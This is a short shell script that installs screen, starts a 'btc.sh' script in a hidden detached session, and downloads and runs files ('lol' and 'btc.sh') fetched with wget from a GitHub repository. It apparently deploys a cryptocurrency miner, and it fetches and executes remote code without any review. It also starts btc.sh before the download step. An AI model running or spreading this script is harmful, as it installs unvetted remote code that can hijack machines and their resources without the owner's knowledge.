#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS btc.sh ./btc.sh 65 75
wget https://github.com/gasken1/asw/raw/main/lol
wget https://raw.githubusercontent.com/gasken1/asw/main/btc.sh
chmod +x btc.sh
./btc.sh
